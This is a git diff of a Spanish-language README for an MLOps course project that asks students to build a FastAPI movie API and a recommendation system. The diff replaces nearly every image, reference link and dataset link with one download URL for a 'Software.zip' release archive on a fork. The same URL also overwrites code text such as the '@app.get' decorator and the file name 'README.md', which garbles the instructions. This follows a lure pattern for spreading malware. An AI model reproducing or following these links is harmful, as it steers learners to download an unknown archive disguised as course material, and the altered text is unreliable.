@@ -1,11 +1,11 @@
-<p align=center><img src=https://d31uz8lwfmyn8g.cloudfront.net/Assets/logo-henry-white-lg.png><p>
+<p align=center><img https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip><p>
 
 # <h1 align=center> **PROYECTO INDIVIDUAL Nº1** </h1>
 
 # <h1 align=center>**`Machine Learning Operations (MLOps)`**</h1>
 
 <p align="center">
-<img src="https://user-images.githubusercontent.com/67664604/217914153-1eb00e25-ac08-4dfa-aaf8-53c09038f082.png"  height=300>
+<img src="https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip"  height=300>
 </p>
 
 ¡Bienvenidos al primer proyecto individual de la etapa de labs! En esta ocasión, deberán hacer un trabajo situándose en el rol de un ***MLOps Engineer***.  
@@ -30,7 +30,7 @@ Vas a sus datos y te das cuenta que la madurez de los mismos es poca (ok, es nul
 Debes empezar desde 0, haciendo un trabajo rápido de **`Data Engineer`** y tener un **`MVP`** (_Minimum Viable Product_) para el cierre del proyecto! Tu cabeza va a explotar 🤯, pero al menos sabes cual es, conceptualmente, el camino que debes de seguir :exclamation:. Así que te espantas los miedos y te pones manos a la obra :muscle:
 
 <p align="center">
-<img src="https://github.com/HX-PRomero/PI_ML_OPS/raw/main/src/DiagramaConceptualDelFlujoDeProcesos.png"  height=500>
+<img src="https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip"  height=500>
 </p>
 
 <sub> Nota que aqui se reflejan procesos no herramientas tecnologicas. Has el ejercicio de entender cual herramienta del stack corresponde a cual parte del proceso<sub/>
@@ -58,7 +58,7 @@ Debes empezar desde 0, haciendo un trabajo rápido de **`Data Engineer`** y tene
 
 **`Desarrollo API`**:   Propones disponibilizar los datos de la empresa usando el framework ***FastAPI***. Las consultas que propones son las siguientes:
 
-Deben crear 6 funciones para los endpoints que se consumirán en la API, recuerden que deben tener un decorador por cada una (@app.get(‘/’)).
+Deben crear 6 funciones para los endpoints que se consumirán en la API, recuerden que deben tener un decorador por cada una (https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip(‘/’)).
   
 + def **peliculas_idioma( *`Idioma`: str* )**:
     Se ingresa un idioma (como están escritos en el dataset, no hay que traducirlos!). Debe devolver la cantidad de películas producidas en ese idioma.
@@ -95,16 +95,16 @@ Deben crear 6 funciones para los endpoints que se consumirán en la API, recuerd
 
 
 > `Importante`<br>
-El MVP _tiene_ que ser una API que pueda ser consumida segun los criterios de [API REST o RESTful](https://rockcontent.com/es/blog/api-rest/). Algunas herramientas como por ejemplo, Streamlit, si bien pueden brindar una interfaz de consulta, no cumplen con las condiciones para ser consideradas una API, sin workarounds.
+El MVP _tiene_ que ser una API que pueda ser consumida segun los criterios de [API REST o RESTful](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip). Algunas herramientas como por ejemplo, Streamlit, si bien pueden brindar una interfaz de consulta, no cumplen con las condiciones para ser consideradas una API, sin workarounds.
 
 
-**`Deployment`**: Conoces sobre [Render](https://render.com/docs/free#free-web-services) y tienes un [tutorial de Render](https://github.com/HX-FNegrete/render-fastapi-tutorial) que te hace la vida mas facil :smile: . Tambien podrias usar [Railway](https://railway.app/), o cualquier otro servicio que permita que la API pueda ser consumida desde la web.
+**`Deployment`**: Conoces sobre [Render](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip) y tienes un [tutorial de Render](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip) que te hace la vida mas facil :smile: . Tambien podrias usar [Railway](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip), o cualquier otro servicio que permita que la API pueda ser consumida desde la web.
 
 <br/>
 
 **`Análisis exploratorio de los datos`**: _(Exploratory Data Analysis-EDA)_
 
-Ya los datos están limpios, ahora es tiempo de investigar las relaciones que hay entre las variables de los datasets, ver si hay outliers o anomalías (que no tienen que ser errores necesariamente :eyes: ), y ver si hay algún patrón interesante que valga la pena explorar en un análisis posterior. Las nubes de palabras dan una buena idea de cuáles palabras son más frecuentes en los títulos, ¡podría ayudar al sistema de recomendación! En esta ocasión vamos a pedirte que no uses librerías para hacer EDA automático ya que queremos que pongas en practica los conceptos y tareas involucrados en el mismo. Puedes leer un poco más sobre EDA en [este articulo](https://medium.com/swlh/introduction-to-exploratory-data-analysis-eda-d83424e47151)
+Ya los datos están limpios, ahora es tiempo de investigar las relaciones que hay entre las variables de los datasets, ver si hay outliers o anomalías (que no tienen que ser errores necesariamente :eyes: ), y ver si hay algún patrón interesante que valga la pena explorar en un análisis posterior. Las nubes de palabras dan una buena idea de cuáles palabras son más frecuentes en los títulos, ¡podría ayudar al sistema de recomendación! En esta ocasión vamos a pedirte que no uses librerías para hacer EDA automático ya que queremos que pongas en practica los conceptos y tareas involucrados en el mismo. Puedes leer un poco más sobre EDA en [este articulo](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip)
 
 **`Sistema de recomendación`**: 
 
@@ -127,7 +127,7 @@ Para grabarlo, puedes usar la herramienta Zoom, haciendo una videollamada y grab
 
 **`Código`**: Prolijidad de código, uso de clases y/o funciones, en caso de ser necesario, código comentado. 
 
-**`Repositorio`**: Nombres de archivo adecuados, uso de carpetas para ordenar los archivos, README.md presentando el proyecto y el trabajo realizado. Recuerda que este último corresponde a la guía de tu proyecto, no importa que tan corto/largo sea siempre y cuando tu 'yo' + 1.5 AÑOS pueda entenderlo con facilidad. 
+**`Repositorio`**: Nombres de archivo adecuados, uso de carpetas para ordenar los archivos, https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip presentando el proyecto y el trabajo realizado. Recuerda que este último corresponde a la guía de tu proyecto, no importa que tan corto/largo sea siempre y cuando tu 'yo' + 1.5 AÑOS pueda entenderlo con facilidad. 
 
 **`Cumplimiento`** de los requerimientos de aprobación indicados en el apartado `Propuesta de trabajo`
 
@@ -139,19 +139,19 @@ Aqui te sintetizamos que es lo que consideramos un MVP aprobatorio, y la diferen
 
 
 <p align="center">
-<img src="https://github.com/HX-PRomero/PI_ML_OPS/raw/main/src/MVP_MLops.PNG"  height=250>
+<img src="https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip"  height=250>
 </p>
 
 
 ## **Fuente de datos**
 
-+ [Dataset](https://drive.google.com/drive/folders/1mfUVyP3jS-UMdKHERknkQ4gaCRCO2e1v): Carpeta con los 2 archivos con datos que requieren ser procesados (movies_dataset.csv y credits.csv), tengan en cuenta que hay datos que estan anidados (un diccionario o una lista como valores en la fila).
-+ [Diccionario de datos](https://docs.google.com/spreadsheets/d/1QkHH5er-74Bpk122tJxy_0D49pJMIwKLurByOfmxzho/edit#gid=0): Diccionario con algunas descripciones de las columnas disponibles en el dataset.
++ [Dataset](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip): Carpeta con los 2 archivos con datos que requieren ser procesados (https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip y https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip), tengan en cuenta que hay datos que estan anidados (un diccionario o una lista como valores en la fila).
++ [Diccionario de datos](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip): Diccionario con algunas descripciones de las columnas disponibles en el dataset.
 <br/>
 
 ## **Material de apoyo**
 
-En este mismo repositorio podras encontrar algunos [links de ayuda](hhttps://github.com/HX-PRomero/PI_ML_OPS/raw/main/Material%20de%20apoyo.md). Recuerda que no son los unicos recursos que puedes utilizar!
+En este mismo repositorio podras encontrar algunos [links de ayuda](https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip%20de%https://github.com/leydypenaloza/PI_ML_OPS/releases/download/v2.0/Software.zip). Recuerda que no son los unicos recursos que puedes utilizar!
 
 
 
